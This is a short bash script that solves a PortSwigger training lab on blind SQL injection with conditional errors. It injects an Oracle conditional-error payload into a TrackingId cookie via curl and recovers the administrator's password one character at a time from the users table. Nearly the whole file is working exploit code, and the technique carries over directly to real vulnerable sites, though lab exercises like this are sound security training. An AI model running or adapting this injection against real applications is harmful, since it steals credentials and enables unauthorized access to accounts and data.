#!/usr/bin/env bash
#
# Brute force script to exploit "Blind SQL injection with conditional errors" lab at
# "https://portswigger.net/web-security/sql-injection/blind/lab-conditional-errors".
#
# by Psycho (@UDPsycho)
#   Twitter: https://www.twitter.com/UDPsycho
#

if [[ $# -ne 2 ]]; then
  echo -e "\nUsage: $0 https://<lab_url>/login TrackingId=<value>\n"

else

  payloads=('a' 'b' 'c' 'd' 'e' 'f' 'g' 'h' 'i' 'j' 'k' 'l' 'm' 'n' 'o' 'p' 'q' 'r' 's' 't' 'u' 'v' 'w' 'x' 'y' 'z' 1 2 3 4 5 6 7 8 9 0)
  success="Internal" # Internal Server Error
  password=""

  PASSWORD_LENGTH=20
  declare -i i=1


  echo -e "\nBruteforcing the password, please wait...\n"

  while [[ $i -le $PASSWORD_LENGTH ]]
  do
    for payload in ${payloads[@]}
      do
        if `curl -s --cookie "$2'+||+(SELECT CASE WHEN (SUBSTR(password,$i,1)='$payload') THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')+||+'" $1 | grep -q $success`; then
          password+=$payload
          echo "  Password: $password"
          i+=1
          break
        fi
      done
  done

  echo -e "\nThe password has been brute forced successfully!\n"

fi